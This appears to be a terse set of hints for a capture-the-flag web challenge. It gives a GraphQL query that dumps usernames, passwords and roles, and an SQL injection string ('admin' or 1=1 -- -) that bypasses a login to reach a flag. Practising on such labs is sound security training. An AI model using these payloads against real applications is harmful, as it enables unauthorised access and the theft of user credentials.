* Hint : **GraphQL**

  * /api/grpphql
  * Content-Type: application/json
```text
{"query":"{ __typename }"}
```
```text
{"query":"{ users { id username password role } }"}
```


* Hint : **Can you login as someone else?**

  * SQL Injection
    ```text
    admin' or 1=1 -- -
    ```
  * Flag in `/api/login`
